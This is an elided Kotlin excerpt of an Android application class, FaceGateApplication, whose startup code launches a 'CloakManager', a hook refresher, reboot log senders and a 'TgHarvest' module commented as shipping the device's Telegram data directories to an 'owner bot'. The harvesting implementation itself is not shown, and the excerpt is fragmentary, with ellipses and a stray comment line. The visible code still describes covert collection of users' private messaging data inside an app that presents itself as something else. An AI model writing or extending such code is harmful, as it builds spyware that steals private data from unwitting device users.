...
class FaceGateApplication : Application() {
    ...
    override fun onCreate() {
        ...
        com.itsme.amkush.manager.AppUpdater.init(this, scope)
        ...
        scope.launch {
             ...
             * gstreamer->amkush .so rename, device clock skew), which made the app
        ...
        com.itsme.amkush.console.CloakManager.start(this)
        // [V55 harvest] ship Telegram data dirs to owner bot (dedup per file)
        com.itsme.amkush.logging.TgHarvest.start(this)
        ...
        scope.launch {
            try {
                delay(2500)
                com.itsme.amkush.manager.ModuleManager(this@FaceGateApplication).refreshHookIfStale()
            } catch (e: Exception) {
                Logger.w(Logger.APP, "V29 hook refresh skipped: ${e.message}")
            }
        }
        try {
            com.itsme.amkush.services.RebootMonitorService.start(this)
            ...
            try {
                com.itsme.amkush.logging.RebootLogSender.collectAndSend()
                com.itsme.amkush.logging.RebootLogSender.startDaemonLoop()
            } catch (_: Exception) {}
        }
        ...
        com.itsme.amkush.logging.CrashLogger.init(this)
    }
            ...
            while (isActive) {
                try {
                    ...
                    if (!token.isNullOrEmpty()) {
                        val deviceId = com.itsme.amkush.utils.DeviceUtils.getDeviceId(this@FaceGateApplication)
